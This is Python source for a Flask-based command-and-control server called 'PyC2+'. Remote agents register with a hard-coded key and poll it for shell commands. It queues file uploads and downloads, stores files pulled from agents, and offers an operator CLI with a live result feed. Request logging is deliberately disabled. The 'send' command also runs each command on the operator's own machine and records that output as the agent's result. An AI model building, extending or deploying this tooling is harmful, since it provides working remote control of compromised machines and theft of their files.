import uuid
import time
import threading
from flask import Flask, request, jsonify
from queue import Queue
import logging
import subprocess
import base64
import os
import json
import os
import platform

# Disable Flask logging in terminal (noise)
log = logging.getLogger('werkzeug')
log.disabled = True

app = Flask(__name__)
app.logger.disabled = True

# CONFIGURATION | improved auth and https in development
AUTH_KEY = "MySecretKey123"
HOST = "0.0.0.0"
PORT = 80

# DATA STORES
agents = {}          # agent_id -> info
tasks = {}           # agent_id -> Queue()
results = {}         # agent_id -> list of dicts {timestamp, result}

# HELPER FUNCTIONS
def auth_check(req):
    return req.headers.get("Authorization") == f"Bearer {AUTH_KEY}"

def timestamp():
    return time.strftime("%Y-%m-%d %H:%M:%S")

def run_local(cmd):
    """Execute a shell command locally and return output."""
    try:
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        out, err = p.communicate()
        return (out + err).strip()
    except Exception as e:
        return f"Error executing command: {e}"

def save_file(agent_id, filename, b64data):
    data = base64.b64decode(b64data)

    # Determine OS-specific Downloads folder
    system = platform.system()
    if system == "Windows":
        downloads_dir = os.path.join(os.environ['USERPROFILE'], "Downloads")
    else:
        downloads_dir = os.path.expanduser("~/Downloads")

    # Create subfolder for specific agent
    agent_dir = os.path.join(downloads_dir, agent_id)
    os.makedirs(agent_dir, exist_ok=True)

    # Full file path
    filepath = os.path.join(agent_dir, filename)

    # Write the file
    with open(filepath, "wb") as f:
        f.write(data)

    return filepath

# FLASK ENDPOINTS
@app.route("/register", methods=["POST"])
def register():
    if not auth_check(request):
        return "Unauthorized", 401

    agent_id = str(uuid.uuid4())
    agents[agent_id] = {"registered_at": timestamp()}
    tasks[agent_id] = Queue()
    results[agent_id] = []

    return jsonify({"agent_id": agent_id})


@app.route("/task/<agent_id>", methods=["GET"])
def get_task(agent_id):
    if not auth_check(request):
        return "Unauthorized", 401

    if agent_id not in agents:
        return "Unknown agent", 404

    if not tasks[agent_id].empty():
        return jsonify({"task": tasks[agent_id].get()})
    return jsonify({"task": None})


@app.route("/task/<agent_id>", methods=["POST"])
def send_task(agent_id):
    if not auth_check(request):
        return "Unauthorized", 401
    if agent_id not in agents:
        return "Unknown agent", 404

    task = request.data.decode()
    tasks[agent_id].put(task)
    return "OK", 200


@app.route("/result/<agent_id>", methods=["POST"])
def receive_result(agent_id):
    if not auth_check(request):
        return "Unauthorized", 401
    if agent_id not in agents:
        return "Unknown agent", 404

    content = request.data.decode()

    # Check if a file result from agent
    try:
        parsed = json.loads(content)
        if parsed.get("type") == "file":
            filename = parsed.get("filename", "output.bin")
            b64 = parsed.get("data", "")
            saved_path = save_file(agent_id, filename, b64)
            readable = f"[FILE SAVED] {saved_path}"
        else:
            readable = content
    except:
        readable = content

    results[agent_id].append({"timestamp": timestamp(), "result": readable})
    return "OK", 200


@app.route("/agents", methods=["GET"])
def list_agents():
    if not auth_check(request):
        return "Unauthorized", 401

    return jsonify({"agents": list(agents.keys())})


@app.route("/history/<agent_id>", methods=["GET"])
def history(agent_id):
    if not auth_check(request):
        return "Unauthorized", 401
    if agent_id not in agents:
        return "Unknown agent", 404

    return jsonify({"results": results[agent_id]})


# CLI 
def cli():
    time.sleep(1)

    # Print CLI banner
    print("\n" + "="*50)
    print("                 PyC2+ CLI")
    print("="*50)
    print("Type 'help' for commands or 'exit' to quit.\n")

    selected = None
    last_seen_index = 0

    def get_prompt():
        """Return prompt showing selected agent."""
        if selected:
            return f"[PyC2+ | {selected}]> "
        return "[PyC2+]> "

    while True:
        try:
            cmd = input(get_prompt()).strip()
        except (KeyboardInterrupt, EOFError):
            print("\nExiting PyC2+ CLI...")
            break

        if not cmd:
            continue

        # Help menu
        if cmd.lower() == "help":
            print("\nAvailable commands:")
            print("  agents                   - list all agents")
            print("  select <id>              - select an agent")
            print("  send <command>           - send shell command")
            print("  put <local> <remote>     - upload file to agent")
            print("  get <remote_path>        - download file from agent")
            print("  history                  - show stored results")
            print("  watch                    - live-feed incoming results")
            print("  exit                     - quit CLI (server keeps running)\n")
            continue

        # List agents
        if cmd.lower() == "agents":
            if not agents:
                print("No agents connected.")
            else:
                print("\nConnected agents:")
                for a in agents.keys():
                    print(f"  {a}")
            continue

        # Select agent
        if cmd.startswith("select "):
            agent_id = cmd.split(" ")[1]
            if agent_id in agents:
                selected = agent_id
                last_seen_index = 0
                print(f"Selected agent: {selected}")
            else:
                print("Invalid agent ID.")
            continue

        # PUT FILE
        if cmd.startswith("put "):
            if not selected:
                print("Select an agent first.")
                continue

            parts = cmd.split(" ")
            if len(parts) < 3:
                print("Usage: put <local_path> <remote_filename>")
                continue

            local, remote = parts[1], parts[2]
            if not os.path.isfile(local):
                print("Local file not found.")
                continue

            with open(local, "rb") as f:
                b64 = base64.b64encode(f.read()).decode()

            payload = json.dumps({"type": "put", "filename": remote, "data": b64})
            tasks[selected].put(payload)
            print(f"Uploaded {local} → {remote} (queued for agent)")
            continue

        # GET FILE
        if cmd.startswith("get "):
            if not selected:
                print("Select an agent first.")
                continue

            remote_path = cmd[len("get "):]
            payload = json.dumps({"type": "get", "path": remote_path})
            tasks[selected].put(payload)
            print(f"Requested file: {remote_path}")
            continue

        # Send command
        if cmd.startswith("send "):
            if not selected:
                print("Select an agent first.")
                continue

            command = cmd[len("send "):]
            tasks[selected].put(command)

            # Run locally and print output
            output = run_local(command)
            print(output)

            # Store in history
            results[selected].append({"timestamp": timestamp(), "result": output})
            continue

        # Show history
        if cmd.lower() == "history":
            if not selected:
                print("No agent selected.")
                continue
            for entry in results[selected]:
                print(f"\n[{entry['timestamp']}]")
                print(entry["result"])
            continue

        # Live watch
        if cmd.lower() == "watch":
            if not selected:
                print("No agent selected.")
                continue

            print(f"\n--- LIVE RESULT FEED ({selected}) ---\n")
            while True:
                current_results = results[selected]
                for entry in current_results[last_seen_index:]:
                    print(f"\n[{entry['timestamp']}]")
                    print(entry["result"])
                last_seen_index = len(current_results)
                time.sleep(0.5)
                if threading.main_thread().is_alive() is False:
                    break
            continue

        # Exit
        if cmd.lower() == "exit":
            print("Leaving CLI. Server still running...")
            break

        print("Unknown command. Type 'help' for a list of commands.")


if __name__ == "__main__":
    threading.Thread(target=cli, daemon=True).start()
    app.run(host=HOST, port=PORT, debug=False, use_reloader=False)
